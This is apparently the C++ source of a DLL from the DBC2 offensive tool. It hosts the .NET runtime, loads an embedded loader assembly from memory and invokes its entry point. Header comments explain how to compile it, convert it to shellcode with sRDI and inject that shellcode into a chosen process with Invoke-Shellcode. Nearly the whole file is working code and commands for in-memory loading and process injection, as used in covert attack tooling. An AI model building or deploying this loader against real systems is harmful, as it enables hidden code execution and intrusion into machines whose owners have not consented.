/*
Author: Arno0x0x, Twitter: @Arno0x0x

=============================== HOW TO COMPILE ===============================
=> Requires VisualStudio

====== x86 (32 bits) DLL:
	1/ First, run the following bat file:
		"c:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\bin\vcvars32.bat"

	2/ Then compile it using
		c:\> cl.exe /LD dbc2LoaderWrapperCLR.cpp /o release_x86\dbc2LoaderWrapperCLR_x86.dll
	
====== x64 (64 bits) DLL:
		1/ First, run the following bat file:
		"C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\bin\x86_amd64\vcvarsx86_amd64.bat"

	2/ Then compile it using
		c:\> cl.exe /LD dbc2LoaderWrapperCLR.cpp /o release_x64\dbc2LoaderWrapperCLR_x64.dll

=============================== HOW TO CONVERT TO SHELLCODE WITH sRDI ===============================
Once compiled as DLL, you can use sRDI to transform this DLL into a shellcode.

NB: You have to use a modified version of ConvertTo-Shellcode.ps1 to convert the supplied UserData to Unicode:
-- $UserDataBytes =  [system.Text.Encoding]::Default.GetBytes($UserData) # + "\0")
++ $UserDataBytes =  [system.Text.Encoding]::Unicode.GetBytes($UserData) # + "\0") 

To get the shellcode as a binary file:
	c:\> powershell.exe
	PS c:\> ipmo ConvertTo-Shellcode.ps1
	
	PS c:\> #x86 DLL 
	PS c:\> ConvertTo-Shellcode -File release_x86\dbc2LoaderWrapperCLR_86.dll -UserData "<all required parameters for the dbc2Loader entryPoint function>" | Set-Content -Path dbc2LoaderWrapperCLR_x86.bin -Encoding Byte
	
	PS c:\> #x64 DLL 
	PS c:\> ConvertTo-Shellcode -File release_x64\dbc2LoaderWrapperCLR_64.dll -UserData "<all required parameters for the dbc2Loader entryPoint function>" | Set-Content -Path dbc2LoaderWrapperCLR_x86.bin -Encoding Byte

Example of injecting the shellcode:
	PS c:\> ipmo Invoke-Shellcode.ps1
	PS c:\> Invoke-Shellcode -Shellcode (Get-Content .\dbc2LoaderWrapperCLR_x64.bin -Encoding byte) -ProcessID <ID of a 64 bits process>
	
=============================== CREDITS ===============================
	Lee Christensen for creating and hosting the CLR in native code, then loading and executing a .Net assembly
	https://github.com/leechristensen/UnmanagedPowerShell

	Nick Landers for sRDI, used for transforming a native DLL to position independant shellcode 
	https://github.com/monoxgas/sRDI
*/

#pragma region Includes and Imports
//#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include "tchar.h"
#include "dbc2LoaderWrapperCLR.h"

#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;

#pragma endregion

typedef HRESULT(WINAPI *funcCLRCreateInstance)(
	REFCLSID  clsid,
	REFIID     riid,
	LPVOID  * ppInterface
	);

typedef HRESULT (WINAPI *funcCorBindToRuntime)(
	LPCWSTR  pwszVersion,
	LPCWSTR  pwszBuildFlavor,
	REFCLSID rclsid,
	REFIID   riid,
	LPVOID*  ppv);


extern const unsigned int dbc2LoaderDLL_len;
extern unsigned char dbc2LoaderDLL[];
void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command);

//=======================================================================================
// Creation of CLR
//=======================================================================================
bool createDotNetFourHost(HMODULE* hMscoree, const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	HRESULT hr = NULL;
	funcCLRCreateInstance pCLRCreateInstance = NULL;
	ICLRMetaHost *pMetaHost = NULL;
	ICLRRuntimeInfo *pRuntimeInfo = NULL;
	bool hostCreated = false;

	pCLRCreateInstance = (funcCLRCreateInstance)GetProcAddress(*hMscoree, "CLRCreateInstance");
	if (pCLRCreateInstance == NULL)
	{
		wprintf(L"Could not find .NET 4.0 API CLRCreateInstance");
		goto Cleanup;
	}

	hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		// Potentially fails on .NET 2.0/3.5 machines with E_NOTIMPL
		wprintf(L"CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		wprintf(L"ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Check if the specified runtime can be loaded into the process.
	BOOL loadable;
	hr = pRuntimeInfo->IsLoadable(&loadable);
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	if (!loadable)
	{
		wprintf(L".NET runtime v4.0.30319 cannot be loaded\n");
		goto Cleanup;
	}

	// Load the CLR into the current process and return a runtime interface
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(ppCorRuntimeHost));
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hostCreated = true;

Cleanup:

	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}

	return hostCreated;
}


HRESULT createDotNetTwoHost(HMODULE* hMscoree, const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	HRESULT hr = NULL;
	bool hostCreated = false;
	funcCorBindToRuntime pCorBindToRuntime = NULL;
	
	pCorBindToRuntime = (funcCorBindToRuntime)GetProcAddress(*hMscoree, "CorBindToRuntime");
	if (!pCorBindToRuntime)
	{
		wprintf(L"Could not find API CorBindToRuntime");
		goto Cleanup;
	}

	hr = pCorBindToRuntime(version, L"wks", CLSID_CorRuntimeHost, IID_PPV_ARGS(ppCorRuntimeHost));
	if (FAILED(hr))
	{
		wprintf(L"CorBindToRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hostCreated = true;

Cleanup:

	return hostCreated;
}

HRESULT createHost(const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	bool hostCreated = false;

	HMODULE hMscoree = LoadLibrary("mscoree.dll");
	
	if (hMscoree)
	{
		if (createDotNetFourHost(&hMscoree, version, ppCorRuntimeHost) || createDotNetTwoHost(&hMscoree, version, ppCorRuntimeHost))
		{
			hostCreated = true;
		}
	}
	
	return hostCreated;
}

//=======================================================================================
// Exported function
// The passed arguments are passed to the 'dbc2loader.dbc2loader.entryPoint' function
//=======================================================================================
extern "C" __declspec(dllexport) int SayHello(wchar_t* argument)
{
	//Debug
	//MessageBoxW(NULL,argument,L"Debug",0);
	//wprintf(argument);
	HRESULT hr;
	ICorRuntimeHost *pCorRuntimeHost = NULL;
	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;

	// The .NET assembly to load.
	bstr_t bstrAssemblyName("dbc2Loader");
	_AssemblyPtr spAssembly = NULL;

	// The .NET class to instantiate.
	bstr_t bstrClassName("dbc2Loader.dbc2Loader");
	_TypePtr spType = NULL;


	// Create the runtime host
	if (!createHost(L"v4.0.30319", &pCorRuntimeHost))
	{
		wprintf(L"Failed to create the runtime host\n");
		goto Cleanup;
	}

	
	// Start the CLR
	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		wprintf(L"CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	DWORD appDomainId = NULL;
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		wprintf(L"RuntimeClrHost::GetCurrentAppDomainId failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Get a pointer to the default AppDomain in the CLR.
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		wprintf(L"ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		wprintf(L"Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Load the assembly from memory
	SAFEARRAYBOUND bounds[1];
	bounds[0].cElements = dbc2LoaderDLL_len;
	bounds[0].lLbound = 0;

	SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);
	memcpy(arr->pvData, dbc2LoaderDLL, dbc2LoaderDLL_len);
	SafeArrayUnlock(arr);

	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);

	if (FAILED(hr))
	{
		wprintf(L"Failed to load the assembly w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Get the Type of PowerShellRunner.
	hr = spAssembly->GetType_2(bstrClassName, &spType);
	if (FAILED(hr))
	{
		wprintf(L"Failed to get the Type interface w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Call the static method of the class
	InvokeMethod(spType, L"entryPoint", argument);

Cleanup:

	if (pCorRuntimeHost)
	{
		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}

	return 0;
}

void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(method);
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtStringArg(command);
	variant_t vtPSEntryPointReturnVal;
	variant_t vtEmpty;


	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	LONG index = 0;
	
	hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);
	if (FAILED(hr))
	{
		wprintf(L"SafeArrayPutElement failed w/hr 0x%08lx\n", hr);
		return;
	}

	// Invoke the method from the Type interface.
	hr = spType->InvokeMember_3(
		bstrStaticMethodName, 
		static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public), 
		NULL, 
		vtEmpty,
		psaStaticMethodArgs, 
		&vtPSEntryPointReturnVal);

	if (FAILED(hr))
	{
		wprintf(L"Failed to invoke dbc2Loader.dbc2Loader.entryPoint w/hr 0x%08lx\n", hr);
		return;
	}

	SafeArrayDestroy(psaStaticMethodArgs);
	psaStaticMethodArgs = NULL;
}

//=======================================================================================
// DllMain
//=======================================================================================
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}